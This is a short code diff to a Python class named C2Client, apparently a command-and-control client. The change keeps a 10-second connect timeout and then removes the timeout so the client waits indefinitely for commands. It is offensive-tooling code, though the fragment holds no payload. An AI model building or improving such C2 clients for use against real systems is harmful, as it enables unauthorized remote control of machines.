@@ -75,8 +75,9 @@ class C2Client:
         try:
             self.debug_log("Attempting connection to {0}:{1}".format(self.ip, self.port))
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.socket.settimeout(10)
+            self.socket.settimeout(10)  # Connection timeout: 10 seconds
             self.socket.connect((self.ip, self.port))
+            self.socket.settimeout(None)  # No timeout after connected - wait indefinitely for commands
             self.debug_log("Connection successful!")
             return True
         except Exception as e:
